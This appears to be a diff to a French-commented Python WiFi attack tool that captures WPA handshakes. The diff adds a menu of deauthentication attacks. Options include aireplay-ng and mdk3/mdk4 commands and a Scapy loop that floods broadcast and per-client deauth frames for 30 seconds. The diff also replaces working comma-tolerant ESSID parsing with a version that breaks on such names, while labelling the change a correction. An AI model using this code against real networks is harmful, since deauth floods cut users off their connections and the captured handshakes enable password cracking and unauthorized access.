@@ -237,8 +237,7 @@ def parse_scan_results(filename):
                     continue
 
                 if section == 1:
-                    # Quelques fichiers CSV aiordump ont un layout variable.
-                    # L'ESSID commence normalement à l'index 13, mais on assemble toutes les colonnes restantes
+                    # Correction : lecture simple de l'ESSID sans assembler les virgules
                     if len(row) < 4:
                         continue
                     bssid = row[0].strip()
@@ -252,14 +251,13 @@ def parse_scan_results(filename):
                     if not channel or not channel.isdigit():
                         channel = "?"
 
-                    # Power et encryption : indices parfois différents ; on protège l'accès
+                    # Power et encryption
                     power = row[8].strip() if len(row) > 8 and row[8].strip() != "" else "-100"
                     enc = row[5].strip() if len(row) > 5 else "?"
-                    # ESSID : assembler toutes les colonnes à partir de 13 pour éviter la casse quand l'ESSID contient des virgules
+                    
+                    # ESSID : simplement prendre la colonne 13 sans assembler
                     essid = ""
-                    if len(row) >= 14:
-                        essid = ",".join([c for c in row[13:] if c is not None]).strip()
-                    elif len(row) > 13:
+                    if len(row) > 13:
                         essid = row[13].strip()
                     else:
                         essid = "<hidden>"
@@ -446,6 +444,15 @@ def capture_handshake(ap, clients, interface):
     
     set_channel(interface, ap['channel'])
     
+    # Menu pour choisir la méthode de déauth
+    print(f"\n{CYAN}[*] Choisissez la méthode de déauthentification:{RESET}")
+    print(f"{YELLOW}1.{RESET} aireplay-ng (standard)")
+    print(f"{YELLOW}2.{RESET} mdk3/mdk4 (plus agressif)")
+    print(f"{YELLOW}3.{RESET} Scapy (personnalisé)")
+    print(f"{YELLOW}4.{RESET} Capture sans déauth (écoute passive)")
+    
+    method_choice = input(f"{ORANGE}[?] Méthode : {RESET}").strip()
+    
     # Lancer airodump pour capturer
     print(f"{CYAN}[*] Démarrage de la capture...{RESET}")
     capture_proc = subprocess.Popen([
@@ -458,13 +465,12 @@ def capture_handshake(ap, clients, interface):
     
     time.sleep(3)
     
-    # Demander si on veut forcer avec deauth
-    force = input(f"{ORANGE}[?] Forcer avec une attaque de déauth? (y/N) : {RESET}").strip().lower()
-    
-    if force == 'y':
-        print(f"{GREEN}[+] Envoi de paquets de déauthentification...{RESET}")
-        if clients.get(ap['bssid']):
-            for client in clients[ap['bssid']]:
+    # Lancer la déauthentification en fonction du choix
+    if method_choice == "1":
+        print(f"{GREEN}[+] Déauthentification via aireplay-ng...{RESET}")
+        client_list = clients.get(ap['bssid'], [])
+        if client_list:
+            for client in client_list:
                 subprocess.Popen([
                     "aireplay-ng", "--deauth", "10",
                     "-a", ap['bssid'], "-c", client, interface
@@ -474,6 +480,57 @@ def capture_handshake(ap, clients, interface):
                 "aireplay-ng", "--deauth", "10",
                 "-a", ap['bssid'], interface
             ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    
+    elif method_choice == "2":
+        # MDK3/MDK4
+        mdk_cmd = None
+        if shutil.which("mdk4") is not None:
+            mdk_cmd = "mdk4"
+        elif shutil.which("mdk3") is not None:
+            mdk_cmd = "mdk3"
+        else:
+            print(f"{RED}[-] mdk3/mdk4 n'est pas installé !{RESET}")
+            mdk_cmd = None
+        
+        if mdk_cmd:
+            print(f"{GREEN}[+] Déauthentification via {mdk_cmd}...{RESET}")
+            try:
+                with open("/tmp/bssid_list.txt", "w") as f:
+                    f.write(ap['bssid'] + "\n")
+                subprocess.Popen([mdk_cmd, interface, "d", "-b", "/tmp/bssid_list.txt", "-c", ap['channel']],
+                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            except:
+                print(f"{RED}[-] Erreur avec {mdk_cmd}{RESET}")
+    
+    elif method_choice == "3":
+        print(f"{GREEN}[+] Déauthentification via Scapy...{RESET}")
+        client_list = clients.get(ap['bssid'], [])
+        
+        def scapy_deauth():
+            end_time = time.time() + 30
+            while time.time() < end_time:
+                pkt = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=ap['bssid'], addr3=ap['bssid']) / Dot11Deauth(reason=7)
+                try:
+                    sendp(pkt, iface=interface, verbose=0)
+                except:
+                    pass
+                for client in client_list:
+                    pkt2 = RadioTap() / Dot11(addr1=client, addr2=ap['bssid'], addr3=ap['bssid']) / Dot11Deauth(reason=7)
+                    try:
+                        sendp(pkt2, iface=interface, verbose=0)
+                    except:
+                        pass
+                time.sleep(0.1)
+        
+        scapy_thread = Thread(target=scapy_deauth)
+        scapy_thread.daemon = True
+        scapy_thread.start()
+    
+    elif method_choice == "4":
+        print(f"{CYAN}[*] Capture passive en cours (sans déauthentification)...{RESET}")
+    
+    else:
+        print(f"{RED}[-] Choix invalide, pas de déauthentification{RESET}")
     
     input(f"\n{YELLOW}[!] Appuyez sur Entrée pour arrêter la capture...{RESET}")
     cleanup()
@@ -774,4 +831,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-    
